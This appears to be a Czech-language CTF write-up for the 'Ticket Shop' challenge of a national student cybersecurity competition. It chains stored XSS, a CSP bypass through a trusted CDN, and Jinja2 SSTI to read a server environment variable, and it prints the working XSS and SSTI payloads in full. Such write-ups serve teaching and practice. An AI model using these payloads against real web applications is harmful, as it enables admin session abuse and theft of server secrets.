<div align="center">

# 🎟️ Ticket Shop

[🇬🇧 English](README.md) · 🇨🇿 **Čeština**

</div>

## Kybersoutěž finále 2026

> **Kybersoutěž** je česká národní soutěž v kybernetické bezpečnosti určená studentům základních, středních i vysokých škol ve věku 9–24 let. Je pořádána ve formátu CTF a jejím cílem je rozvíjet digitální dovednosti, vyhledávat talenty a zvyšovat povědomí o kybernetických hrozbách mezi mladou generací v České republice.

### Přehled

Vlajka (flag) je uložena jako proměnná prostředí na straně serveru. Cílem je ji vyexfiltrovat zřetězením uloženého (stored) XSS zranitelnosti s payloadem pro Server-Side Template Injection (SSTI), který je vložen do šablony PDF vstupenky.

**Řetězec útoku:**

1. Vytvořit XSS payload, který se provede v prohlížeči administrátora
2. Pomocí XSS vytvořit škodlivou šablonu PDF vstupenky obsahující SSTI payload, který přečte proměnnou prostředí `FLAG`
3. Pomocí XSS vytvořit novou událost (event) přiřazenou k této šabloně
4. Jako běžný uživatel zakoupit vstupenku na danou událost
5. Stáhnout vygenerovanou PDF vstupenku, která bude obsahovat vlajku

---

### Infrastruktura

Výzva je nasazena přes `docker-compose.yaml`:

```yaml
version: '3.7'

services:
redis:
    container_name: ticketshop-redis
    image: "cgr.dev/chainguard/redis:latest"
    platform: linux/amd64

web:
    container_name: ticketshop-web
    build:
    context: .
    dockerfile: Dockerfile
    platform: linux/amd64
    ports:
        - "1337:1337"
    environment:
    # DŮLEŽITÉ: Před nasazením změňte ADMIN_PASSWORD!
    # Výchozí heslo nesmí být použito v produkci.
    ADMIN_PASSWORD: ${ADMIN_PASSWORD:-admin_secure_password_2026}
    REDIS_URL: redis://ticketshop-redis:6379
    FLAG: ${FLAG:-FLG{example_flag_for_development}}
    depends_on:
    - redis

bot:
    container_name: ticketshop-bot
    build:
    context: src/bot/
    dockerfile: Dockerfile
    platform: linux/amd64
    shm_size: 2gb
    environment:
    # DŮLEŽITÉ: Musí se shodovat s ADMIN_PASSWORD služby web
    ADMIN_PASSWORD: ${ADMIN_PASSWORD:-admin_secure_password_2026}
    APP_URL: http://ticketshop-web:1337
    REDIS_URL: redis://ticketshop-redis:6379
    depends_on:
    - redis
    - web
```

Vlajka je do kontejneru `web` předána jako proměnná prostředí `FLAG`. Služba `bot` simuluje administrátora, který aplikaci periodicky navštěvuje — to je cíl pro XSS.

---

### Analýza zranitelnosti

#### Krok 1 — Identifikace vstupního bodu pro XSS

![Stránka účtu v ticket shopu](ticket-shop-1.png)

Po registraci uživatelského účtu je možné vložit kredit a k žádosti přidat volitelnou poznámku. Toto pole poznámky je zranitelné vůči **uloženému (stored) XSS**.

#### Krok 2 — Pochopení administrátorských endpointů

Prohlídka zdrojového kódu odhalí dva klíčové endpointy dostupné jen administrátorovi. První vytváří šablony vstupenek z čistého HTML:

```python
    @admin_bp.route('/templates/create', methods=['GET', 'POST'])
    @admin_required
    def create_template():
        """Create new ticket template"""
        if request.method == 'POST':
            name = request.form.get('name', '').strip()
            html_content = request.form.get('html_content', '').strip()
            is_default = request.form.get('is_default') == 'on'

            if not name or not html_content:
                flash('Please provide template name and content.', 'error')
                return redirect(url_for('admin.create_template'))

            # If setting as default, unset other defaults
            if is_default:
                TicketTemplate.query.update({'is_default': False})

            template = TicketTemplate(
                name=name,
                html_content=html_content,
                is_default=is_default
            )

            db.session.add(template)
            db.session.commit()

            flash(f'Template "{name}" created successfully.', 'success')
            return redirect(url_for('admin.templates'))

        # Provide default template as starting point
        default_html = get_default_ticket_template()
        return render_template('admin/templates/create.html', default_html=default_html)
```


```python
    @admin_bp.route('/events/create', methods=['GET', 'POST'])
    @admin_required
    def create_event():
        """Create new event"""
        if request.method == 'POST':
            name = request.form.get('name', '').strip()
            description = request.form.get('description', '').strip()
            date_str = request.form.get('date', '')
            time_str = request.form.get('time', '')
            location = request.form.get('location', '').strip()
            ticket_price = request.form.get('ticket_price', '')
            total_tickets = request.form.get('total_tickets', '')
            is_published = request.form.get('is_published') == 'on'
            template_id = request.form.get('template_id') or None

            # Validation
            if not all([name, description, date_str, time_str, location, ticket_price, total_tickets]):
                flash('Please fill in all required fields.', 'error')
                return redirect(url_for('admin.create_event'))

            try:
                # Combine date and time
                datetime_str = f"{date_str} {time_str}"
                event_date = datetime.strptime(datetime_str, '%Y-%m-%d %H:%M')
                ticket_price = float(ticket_price)
                total_tickets = int(total_tickets)

                if ticket_price < 0 or total_tickets < 1:
                    raise ValueError("Invalid price or ticket count")

            except ValueError as e:
                flash(f'Invalid input: {str(e)}', 'error')
                return redirect(url_for('admin.create_event'))

            # Handle image upload
            image_path = None
            if 'image' in request.files:
                file = request.files['image']
                if file and file.filename and allowed_file(file.filename):
                    filename = secure_filename(file.filename)
                    # Add timestamp to avoid conflicts
                    filename = f"{datetime.now().timestamp()}_{filename}"
                    filepath = os.path.join(current_app.config['UPLOAD_FOLDER'], filename)
                    file.save(filepath)
                    image_path = f"uploads/{filename}"

            event = Event(
                name=name,
                description=description,
                date=event_date,
                location=location,
                image_path=image_path,
                ticket_price=ticket_price,
                total_tickets=total_tickets,
                is_published=is_published,
                ticket_template_id=int(template_id) if template_id else None
            )

            db.session.add(event)
            db.session.commit()

            flash(f'Event "{name}" created successfully.', 'success')
            return redirect(url_for('admin.events'))

        templates = TicketTemplate.query.all()
        return render_template('admin/events/create.html', templates=templates)
```

Druhý endpoint vytváří události a umožňuje přiřadit vlastní šablonu vstupenky. Zásadní je, že `html_content` šablony je na straně serveru vykreslován pomocí Jinja2 při generování PDF vstupenky — to znamená, že je zranitelný vůči **SSTI**.

#### Krok 3 — Vytvoření XSS payloadu

XSS payload se automaticky provede, jakmile admin bot navštíví stránku „Credit Requests“ (žádosti o kredit). Provede jménem administrátora dva autentizované `POST` požadavky:

1. Vytvoří šablonu vstupenky, jejíž `html_content` obsahuje SSTI výraz, který přečte proměnnou prostředí `FLAG`
2. Vytvoří novou veřejnou událost přiřazenou k této šabloně

**Logika XSS payloadu (neminifikovaná):**

```javascript
    var t = new FormData();

    t.append('name', 'p');
    t.append('html_content', `{{lipsum.__globals__['os'].environ.get('FLAG')}}`);
    t.append('is_default', 'on');

    fetch('/admin/templates/create', { method:'POST', body: t })
    .then(r => r.text())
    .then(h => {
        var m = h.match(/templates\/(\d+)\/edit/);
        var id = m ? m[1] : '2';
        var e = new FormData();
        e.append('name', 'flagev');
        e.append('date', '2027-01-01');
        e.append('time', '12:00');
        e.append('description', 'x');
        e.append('location', 'x');
        e.append('ticket_price', '0');
        e.append('total_tickets', '999');
        e.append('is_published', 'on');
        e.append('template_id', id);
        fetch('/admin/events/create', { method:'POST', body: e })
    })
```

#### Krok 4 — Obejití Content Security Policy

Aplikace nastavuje následující CSP hlavičky:

```python
    # Add security headers including CSP
    @app.after_request
    def add_security_headers(response):
        # Strict CSP to prevent XSS exploitation
        csp_directives = [
            "default-src 'self'",
            "script-src 'self' https://cdn.jsdelivr.net",
            "style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'",
            "font-src 'self' https://cdn.jsdelivr.net",
            "img-src 'self' data:",
            "connect-src 'self' https://cdn.jsdelivr.net",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'"
        ]
        response.headers['Content-Security-Policy'] = "; ".join(csp_directives)
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        return response
```

CSP blokuje inline skripty, ale důvěřuje doméně `https://cdn.jsdelivr.net`. Jednou možností by bylo publikovat JavaScriptový soubor do GitHub repozitáře a servírovat ho přes jsDelivr, to je ale časově náročné. Rychlejší přístup je použít knihovnu [`csp-bypass`](https://github.com/CanardMandarin/csp-bypass), která je už hostovaná na jsDelivr a provádí JavaScript dodaný prostřednictvím atributu `csp` — tím se CSP-důvěryhodné CDN obrátí proti samotné CSP.

**Finální XSS payload (vložený do pole poznámky u žádosti o kredit):**

```html
</td>
</tr>
</tbody>

</table>
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script>
<br csp="var t=new FormData();t.append('name','p');t.append('html_content',`{{lipsum.__globals__['os'].environ.get('FLAG')}}`);t.append('is_default','on');fetch('/admin/templates/create',{method:'POST',body:t}).then(r=>r.text()).then(h=>{var m=h.match(/templates\/(\d+)\/edit/);var id=m?m[1]:'2';var e=new FormData();e.append('name','flagev');e.append('date','2027-01-01');e.append('time','12:00');e.append('description','x');e.append('location','x');e.append('ticket_price','0');e.append('total_tickets','999');e.append('is_published','on');e.append('template_id',id);fetch('/admin/events/create',{method:'POST',body:e})})">
<table>

<tbody>
<tr>
<td>
```


---

### Exploitace

![Pole poznámky u žádosti o kredit s payloadem](ticket-shop-2.png)

XSS payload se vloží do pole poznámky u žádosti o kredit a odešle se.

![Administrátorská stránka žádostí o kredit](ticket-shop-admin-1.png)

Když admin bot navštíví stránku „Credit Requests“, uložené XSS se automaticky a nenápadně spustí a vytvoří škodlivou šablonu a událost.

![Výpis událostí se zobrazenou novou událostí „flagev“](ticket-shop-3.png)

Po přechodu na stránku „Events“ se objeví nově vytvořená událost `flagev`, což potvrzuje, že se XSS úspěšně provedlo.

![Detail události](ticket-shop-4.png)

Otevření stránky s detailem události a vložení vstupenky do košíku.

![Nákupní košík](ticket-shop-5.png)

Kontrola nákupního košíku.

![Stránka pokladny](ticket-shop-6.png)

Přechod k pokladně.

![Stránka potvrzení objednávky](ticket-shop-7.png)

Dokončení objednávky.

![PDF vstupenka obsahující vlajku](ticket-shop-8.png)

Vygenerovaná PDF vstupenka obsahuje vlajku, extrahovanou z proměnné prostředí serveru pomocí SSTI payloadu vykresleného Jinja2.
</content>
